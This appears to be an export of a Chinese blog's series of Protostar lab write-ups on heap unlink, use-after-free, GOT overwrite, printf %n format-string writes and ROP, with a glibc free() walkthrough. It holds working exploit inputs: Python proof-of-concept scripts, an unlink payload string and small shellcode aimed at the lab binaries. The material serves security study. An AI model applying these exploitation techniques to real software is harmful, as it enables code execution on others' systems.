#include &lt;stdio.h&gt; void winner() { printf(&quot;that wasn&#39;t too bad now, was it? @ %d\\n&quot;, time(NULL)); } int main(int argc, char **argv) { char *a, *b, *c; a = malloc(32); b = malloc(32); c = malloc(32); strcpy(a, argv[1]); strcpy(b, argv[2]); strcpy(c, argv[3]); free(c); free(b); free(a); printf(&quot;dynamite failed?\\n&quot;); } 0x02 简单分析&amp;思考在这个程序中虽然我们知道有堆溢出的问题，可是堆上并没有什么逻辑上的漏洞，没有可利用的指针？没有UAF漏洞？那怎么才能执行到winner()函数呢？似乎是不可能的事。但通过之前对linux堆管理的分析，可知free()函数中的unlink()函数能够造成一个任意地址写的可能，再像之前那样来修改GOT表，不就是可以执行winner()函数了吗？所以要执行unlink()函数就需要构造两个chunk合并的过程，继而将一个chunk从原来的双链表中unlink下来。就照着这个思路来一步步实现这个过程。 0x03 调试1.输入AAAA BBBB CCCC然后free前后后观察堆结构由上图可得，一共有三个分配的chunk，大小都为29(101001)末位表示前一个chunk正在使用。可以看到最后还有一个很大的chunk，这就是上文所指的topchunk。因为chunk的大小2–&gt;3–&gt;null`的方式连接 2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为0x64=100字节。因为我们准备向前合并，所以将preinuse位设为1，即64+1=65 3.然后还需要构造一个假的chunk让其unlink，这个chunk将精心构造，首先fd=GoT地址 bk=winner地址？等等，这里存在一个问题在于：GoT=winner地址，但winner=GoT在会发生段错误，所以这里有个小技巧在于bk=堆地址，GoT-12=堆地址，然后堆中填上shellcode，去调用winner。构造字符串：CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\\xfc\\xff\\xff\\xff\\xfc\\xff\\xff\\xff\\x1c\\xb1\\x04\\x08\\x0c\\xc0\\x04\\x08 4.现在我们需要构造shellcode，因为堆地址+16字节出会写入GoT地址，所以我们的shellcode要足够小，正好我们仅仅需要调用winner而已。这里我们用在线的转换工具下面的汇编转化为x86指令字符串 mov eax,0x8048864 call eax 0x8048864为winner()函数地址 5.将上面的shellcode写入第一个chunk那里，here we hack！下图可以看到shellcode后面就被填入了GoT地址，也说明了shellcode只能为8字节大小。GoT地址已经修改，下面可以看到已经执行了winnwe()函数 0x04 一点补充在上面构造chunk中，也许你已经发现了chunk大小为0xfffffffc，这是一个什么巧妙的方法去绕过free()里面的检查等。具体的细节可以看Once upon a free()这篇文章，简单的说就是当某个数加上0xfffffffc时会造成溢出相当于减4从而使其向前偏移4个字节，绕过检查，避免崩溃。 0x05 堆漏洞学习总结目前可能这是最后一个堆漏洞的学习，这个堆漏洞的学习理解到动手前后花费了大量时间，不过这都是值得的，如果能够坚持下来，将会对堆漏洞有一个清晰的认识。以后再遇到漏洞或者别人的分析能够快速准确的理解。虽然现在堆管理代码经过了很多改善和patch，但基本和关键的技术还是没变。所以keep hacking!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"metadata","slug":"metadata","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/metadata/"},{"name":"DLMalloc","slug":"DLMalloc","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/DLMalloc/"}]},{"title":"深入理解Linux堆分配器-DLMalloc","date":"2017-04-23T04:16:00.000Z","path":"2017/04/23/Linux堆分配器-DLMalloc/Linux堆分配器-DLMalloc/","text":"0x00 序 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux的堆管理一直是不能甚解。因此这篇文章将对Linux的DLMalloc进行详细的介绍，以此对操作系统的堆管理有一个清晰整体的认识，当我在学习的过程中，好像没有发现一篇中文文章来详细介绍相关内容，所以本文仅仅是我通过学习和实践得到的理解，若有不对，请指出。 0x01 目录1.DLMalloc2.内存Chunk3.Bin4.malloc源码free()函数分析 0x02 DLMallocDoug Lea’s Malloc (dlmalloc)是一个GNU C库的内存分配器，它能够通过calloc(),malloc(), free()和realloc()等动态分配和释放的函数来管理内存。明显内存分配器在操作系统中是相当重要的，主要在需要满足下列的特点： 稳定性(stability) 性能(performance) 避免碎片化(avoidance of fragmentation) 低空间开销(low space overhead）根据上面的内存特点，将有助于后面对chunk以及Bin等的理解。 0x03 内存chunk1.什么是chunk？chunk是堆中一些连续的内存块，可以用作分配，释放，拆分，合并。不存在两个连续的释放chunk，这是在于相邻的chunk会合并。 2.数据结构 struct malloc_chunk { INTERNAL_SIZE_T prev_size; //当前chunk前一个chunk的大小，仅在前一个为freed才使用 INTERNAL_SIZE_T size; //当前chunk的大小 struct malloc_chunk * fd; //如果当前为释放chunk，指向双向free list中前一个chunk struct malloc_chunk * bk; //如果当前为释放chunk，指向双向free list中后一个chunk } 根据上面的描述我们可以知道，chunk在分配时和释放时数据结构是不同的，看下面的图例: allocate chunk freed chunk 3.更多细节因为chunk是按照8字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？然后可以想到有一个最小chunk的存在，其大小为16字节()。 4.特殊chunktop chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。 last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is the result of allocation requests for small chunks that have no exact fit in any of the bins. If the request is larger than the last_remainder chunk but smaller than a block in a bin, then the chunk is split again. The last_remainder chunk is the result of having to split a larger chunk into two, one part of it is handed out from the allocation, and the other because the last_remainder chunk. 0x04 Binchunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。这里我主要介绍fsatbin和normalbin (1)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。(2)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。 0x05 free()源代码分析及相关细节free(void *mem)--&gt;__libc_free(void *mem) void __libc_free (void *mem) { mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) { (*hook)(mem, RETURN_ADDRESS (0)); return; } if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) { mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk (p); return; } ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); //跳转到_int_free } 我们先不关注其他的，只需要知道会调用_int_free就就可以了 __libc_free(void *mem)--&gt;_int_free (mstate av, mchunkptr p, int have_lock) static void _int_free (mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* 当前chunk的大小 */ mfastbinptr *fb; /* 相关的fastbin */ mchunkptr nextchunk; /* 下一个相邻的chunk */ INTERNAL_SIZE_T nextsize; /* 下一个chunk的大小 */ int nextinuse; /* 下一个chunk正在使用时为真 */ INTERNAL_SIZE_T prevsize; /* 前一个chunk的大小 */ mchunkptr bck; /* 指向free链表中向后一个chunk */ mchunkptr fwd; /* 指向free链表中向前一个chunk */ const char *errstr = NULL; int locked = 0; size = chunksize (p); /* Little security check which won&#39;t hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by &quot;design&quot; from some intruder. */ //一些安全检查 if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) { errstr = &quot;free(): invalid pointer&quot;; errout: if (!have_lock &amp;&amp; locked) __libc_lock_unlock (av-&gt;mutex); malloc_printerr (check_action, errstr, chunk2mem (p), av); return; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ //检查是否满足大于等于最小大小 if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) { errstr = &quot;free(): invalid size&quot;; goto errout; } check_inuse_chunk(av, p); //检查当前chunk是否在使用 /* 如果满足，则将该chunk放入fastbin以便malloc时能够快速找到和使用 */ if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don&#39;t place chunks bordering top into fastbins */ &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) #endif ) { if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert (locked == 0); __libc_lock_lock (av-&gt;mutex); locked = 1; chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; })) { errstr = &quot;free(): invalid next size (fast)&quot;; goto errout; } if (! have_lock) { __libc_lock_unlock (av-&gt;mutex); locked = 0; } } free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &amp;fastbin (av, idx); /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = &quot;double free or corruption (fasttop)&quot;; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0)) { errstr = &quot;invalid fastbin entry (free)&quot;; goto errout; } } /* Consolidate other non-mmapped chunks as they arrive. */ //检查是否是通过mmap()分配的内存 else if (!chunk_is_mmapped(p)) { if (! have_lock) { __libc_lock_lock (av-&gt;mutex); locked = 1; } nextchunk = chunk_at_offset(p, size);//返回下一个chunk的地址 /* Lightweight tests: check whether the block is already the top block. */ //检查下一个是否为top-chunk if (__glibc_unlikely (p == av-&gt;top)) { errstr = &quot;double free or corruption (top)&quot;; goto errout; } /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect (contiguous (av) &amp;&amp; (char *) nextchunk &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0)) { errstr = &quot;double free or corruption (out)&quot;; goto errout; } /* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) { errstr = &quot;double free or corruption (!prev)&quot;; goto errout; } nextsize = chunksize(nextchunk); if (__builtin_expect (chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) { errstr = &quot;free(): invalid next size (normal)&quot;; goto errout; } free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); /* 与后面chunk一个合并 */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);//将后一个chunk从双向链表上取下来 } if (nextchunk != av-&gt;top) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); /* 与前面chunk一个合并*/ if (!nextinuse) { unlink(av, nextchunk, bck, fwd);//将前一个chunk从双向链表上取下来 size += nextsize; } else clear_inuse_bit_at_offset(nextchunk, 0); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) { errstr = &quot;free(): corrupted unsorted chunks&quot;; goto errout; } p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size)) { p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; } bck-&gt;fd = p; fwd-&gt;bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); } /* 如果当前chunk正好与topchunk相邻，则合并到topchunk */ else { size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; check_chunk(av, p); } /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don&#39;t know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don&#39;t want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) { if (have_fastchunks(av)) malloc_consolidate(av); if (av == &amp;main_arena) { #ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av); #endif } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-&gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); } } if (! have_lock) { assert (locked); __libc_lock_unlock (av-&gt;mutex); } } /* If the chunk was allocated via mmap, release via munmap(). */ else { munmap_chunk (p); } } 这里看看unlink()宏定义 #define unlink( P, BK, FD ) { BK = P-&gt;bk; FD = P-&gt;fd; FD-&gt;bk = BK; //可能会造成任意写 BK-&gt;fd = FD; } 现在我们重点放在unlink()，当两个相邻chunk需要合并的时候，势必需要将临近的chunk从原来的双链表上取下来，然后与当前chunk合并成一个更大的块。等等！怎么取下来的呢？如果这里存在一个恶意的chunk即fd和bk都是一些恶意地址指针，则会出现任意地址写的一个漏洞。在这里我们就先不去讨论进一步的利用过程，只需知道存在一个这样的漏洞即可，后面会根据这个分析去漏洞利用。 glibc/malloc.c源码 0x06 参考 Vudo malloc tricks A Memory Allocator Once upon a free()","tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"},{"name":"heap","slug":"heap","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"},{"name":"malloc","slug":"malloc","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/malloc/"},{"name":"free","slug":"free","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/free/"}]},{"title":"Protostar-堆溢出学习-UAF(use after free)","date":"2017-04-21T03:12:19.000Z","path":"2017/04/21/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/","text":"0x00 序 下面看一个堆中常见的漏洞-UAF(use after free) 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; struct auth { char name[32]; int auth; }; struct auth *auth; char *service; int main(int argc, char **argv) { char line[128]; while(1) { printf(&quot;[ auth = %p, service = %p ]\\n&quot;, auth, service); if(fgets(line, sizeof(line), stdin) == NULL) break; if(strncmp(line, &quot;auth &quot;, 5) == 0) { auth = malloc(sizeof(auth)); memset(auth, 0, sizeof(auth)); if(strlen(line + 5) &lt; 31) { strcpy(auth-&gt;name, line + 5); } } if(strncmp(line, &quot;reset&quot;, 5) == 0) { free(auth); } if(strncmp(line, &quot;service&quot;, 6) == 0) { service = strdup(line + 7); } if(strncmp(line, &quot;login&quot;, 5) == 0) { if(auth-&gt;auth) { printf(&quot;you have logged in already!\\n&quot;); } else { printf(&quot;please enter your password\\n&quot;); } } } } 0x02 分析&amp;思考程序有4个命令，对auth这个结构体进行分配内存以及释放内存，然后有结构体里的auth-&gt;auth来决定是否授权。很明显让我们修改auth-&gt;auth的值。reset命令释放auth但没有设为null，后面auth-&gt;auth发生引用。所以这里有个UAF漏洞。 0x03 调试&amp;hack1.在第一个printf处下个断点，观察每次分配和释放后堆，auth以及service的情况 2.先输入auth admin，然后输入login试试3.再输入reset释放堆内存4.输入service分配内存5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖auth-&gt;auth的内存值。6.再次输入login命令 0x04 一点感受通过这个例子简单的学习了UAF漏洞后，无疑free后不设为null，后果是不敢想象的。继续学习堆相关的漏洞利用。keep hack！","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"UAF","slug":"UAF","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/UAF/"}]},{"title":"Protostar-堆溢出学习-strcpy堆指针造成任意地址GOT表写","date":"2017-04-19T03:12:19.000Z","path":"2017/04/19/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/","text":"0x00 序 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; struct internet { int priority; char *name; }; void winner() { printf(&quot;and we have a winner @ %d\\n&quot;, time(NULL)); } int main(int argc, char **argv) { struct internet *i1, *i2, *i3; i1 = malloc(sizeof(struct internet)); i1-&gt;priority = 1; i1-&gt;name = malloc(8); i2 = malloc(sizeof(struct internet)); i2-&gt;priority = 2; i2-&gt;name = malloc(8); strcpy(i1-&gt;name, argv[1]); strcpy(i2-&gt;name, argv[2]); printf(&quot;and that&#39;s a wrap folks!\\n&quot;); } 0x02 简单的分析&amp;思考如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个strcpy，肯定是要去覆盖和修改某个地方的地址。其实strcpy这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。在这个列子中，我们就借此去修改printf函数的GOT表。 0x03 调试1.查看堆分配情况2.查看汇编代码，找到执行入口3.首先利用第一个strcpy将i2的name指针改为GOT表地址，然后利用第二个strcpy向这个地址写入winner的地址，由此编写对应的Python PoC import struct padding = &quot;AAAA&quot;*5 put_got = struct.pack(&quot;I&quot;, 0x8049774) #put的GOT表地址 space = &quot; &quot; winner = struct.pack(&quot;I&quot;, 0x8048494) #winner函数地址 print padding+put_got+space+winner 4.hack user@protostar:/tmp$ /opt/protostar/bin/heap1 `python heap1.py` and we have a winner @ 1492452139 成功执行winner函数 0x04 一点感受学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将strcpy改为strncpy或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"strcpy","slug":"strcpy","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/strcpy/"},{"name":"GOT表","slug":"GOT表","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/GOT表/"}]},{"title":"Protostar-堆溢出学习-覆盖堆函数指针劫持代码流","date":"2017-04-18T03:12:19.000Z","path":"2017/04/18/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/","text":"0x00 序 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。 0x01 C语言源代码C代码 #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; struct data { char name[64]; }; struct fp { int (*fp)(); }; void winner() { printf(&quot;level passed\\n&quot;); } void nowinner() { printf(&quot;level has not been passed\\n&quot;); } int main(int argc, char **argv) { struct data *d; struct fp *f; d = malloc(sizeof(struct data)); f = malloc(sizeof(struct fp)); f-&gt;fp = nowinner; printf(&quot;data is at %p, fp is at %p\\n&quot;, d, f); strcpy(d-&gt;name, argv[1]); f-&gt;fp(); } 0x02 简单分析&amp;思考先在堆上分配了一个data和fp的结构体，然后使fp指向nowinner函数，然后打印对应分配的堆地址，以及将argv[1]复制到data结构体，最后调用nowinner函数。 可以知道我们需要去执行winner函数，怎么做到呢？ 由于strcpy没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为winner函数？Here we go！ 0x03 malloc()在继续分析之前，我们先来简单的介绍一下malloc函数，在这里malloc函数更多是对mmap系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用mmap来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。 那是如何管理堆的呢？见下 堆标志 分配大小 malloc返回地址addr 00000000 00000011 00000000 00000000 00000000 00000031 AAAAAAAA BBBBBBBB CCCCCCCC DDDDDDDD EEEEEEEE FFFFFFFF … … … … 00000000 00000011 00000000 00000000 每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过addr-4拿到自身的分配大小从而决定下次分配的选择 注：分配大小的第一位表示前面的内存块是否在使用 0x04 调试&amp;hack通过前面的分析，我们的目的很明确，需要通过strcpy(d-&gt;name, argv[1]);去重写fp结构体里面的函数指针，使其为winner函数的地址。 1.利用gdb查看strcpy前后堆的情况我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的nowinner地址改为winner地址 2.查看winner地址，重写fp函数指针 (gdb) p winner $1 = {void (void)} 0x8048464 &lt;winner&gt; 3.PoC Python脚本 import struct padding = &quot;A&quot;*64 #填充data head = &quot;BBBB&quot; # not care head += &quot;CCCC&quot; # not care winner = struct.pack(&quot;I&quot;, 0x8048464) #将nowinner地址改为winner地址 print padding+head+winner 4.hack成功执行winner函数!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"}]},{"title":"Protostar-栈溢出学习-printf格式%n任意地址写","date":"2017-04-17T03:12:19.000Z","path":"2017/04/17/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/","text":"0x00 序 从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int target; void vuln(char *string) { printf(string); if(target) { printf(&quot;you have modified the target :)\\n&quot;); } } int main(int argc, char **argv) { vuln(argv[1]); } 0x02 疑惑&amp;分析&amp;思考拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量target的值。但好像除了printf()函数，就没有其他可疑的地方了。what fuck？ 一个printf()函数怎么会有漏洞？ 但仔细观察可以发现这次printf的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？ 0x03 测试其他不说，先运行下程序试试再试着输入格式字符试试很奇怪，我们貌似得到一些栈中的值，再多打印一些试试可以看到后面打印出来了%x本身&lt;—20782520，通过linux stack layout可得知后面的确保存着参数字符串 ... local variables of main saved registers of main return address of main argc argv envp stack from startup code argc argv pointers NULL that ends argv[] environment pointers NULL that ends envp[] ELF Auxiliary Table argv strings &lt;--------focus here environment strings program name NULL 更多关于linux栈布局 0x04 你不知道的printf虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？ 关注printf函数，有这么一段话： Code such as printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole. 简单就是说%n可以写入一个内存地址，其值为前面的字符数 [n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is con‐verted. 看个例子这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了 0x05 hack先利用objdump -t找到target的地址利用一句话Python反复测试 /opt/protostar/bin/format1 &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\\x38\\x96\\x04\\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*135&quot;&#39;`&quot; 调整%x的个数，使其target地址为最后一个然后将最后一个%x改为%n /opt/protostar/bin/format1 &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\\x38\\x96\\x04\\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*134+&quot;%n &quot;&#39;`&quot; run!成功修改target值! 0x06 一点感悟总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！ 0x07 参考链接 更多关于linux栈布局 What is the use of the %n format specifier in C? Protostar/Format 1","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"printf","slug":"printf","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/printf/"},{"name":"format","slug":"format","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/format/"}]},{"title":"Protostar-栈溢出学习-ROP执行shellcode","date":"2017-04-16T03:12:19.000Z","path":"2017/04/16/Protostar-栈溢出系列学习-Stack 3/Protostar-栈溢出系列学习-Stack 3/","text":"0x00 序 和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。 0x01 stack3#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\\n&quot;, ret); _exit(1); } printf(&quot;got path %s\\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } 0x02 思路&amp;分析整体上和前面的没太大区别，现在有个问题在于__builtin_return_address()会返回当前的返回地址值，然后后面ret &amp; 0xbf000000) == 0xbf000000对其返回地址进行了限制–返回地址不能是0xbf为前缀，正好是栈的前缀。这样的话就不能像之前那样直接返回到栈中，也不能执行栈上的shellcode。 怎么绕过呢？ Ret2libc or ROP(return orientated programming) 0x03 ROP一个巧妙的方法在于我们不直接返回到栈中执行shellcode，而是返回到原本的程序之中。这里我们返回到getpath()的ret指令处。在后面在存放shellcode，而再次执行ret时就会跳转到后面执行我们的shellcode。 getpath()汇编Dump of assembler code for function getpath: 0x08048484 &lt;getpath+0&gt;: push ebp 0x08048485 &lt;getpath+1&gt;: mov ebp,esp 0x08048487 &lt;getpath+3&gt;: sub esp,0x68 0x0804848a &lt;getpath+6&gt;: mov eax,0x80485d0 0x0804848f &lt;getpath+11&gt;: mov DWORD PTR [esp],eax 0x08048492 &lt;getpath+14&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x08048497 &lt;getpath+19&gt;: mov eax,ds:0x8049720 0x0804849c &lt;getpath+24&gt;: mov DWORD PTR [esp],eax 0x0804849f &lt;getpath+27&gt;: call 0x80483b0 &lt;fflush@plt&gt; 0x080484a4 &lt;getpath+32&gt;: lea eax,[ebp-0x4c] 0x080484a7 &lt;getpath+35&gt;: mov DWORD PTR [esp],eax 0x080484aa &lt;getpath+38&gt;: call 0x8048380 &lt;gets@plt&gt; 0x080484af &lt;getpath+43&gt;: mov eax,DWORD PTR [ebp+0x4] 0x080484b2 &lt;getpath+46&gt;: mov DWORD PTR [ebp-0xc],eax 0x080484b5 &lt;getpath+49&gt;: mov eax,DWORD PTR [ebp-0xc] 0x080484b8 &lt;getpath+52&gt;: and eax,0xbf000000 0x080484bd &lt;getpath+57&gt;: cmp eax,0xbf000000 0x080484c2 &lt;getpath+62&gt;: jne 0x80484e4 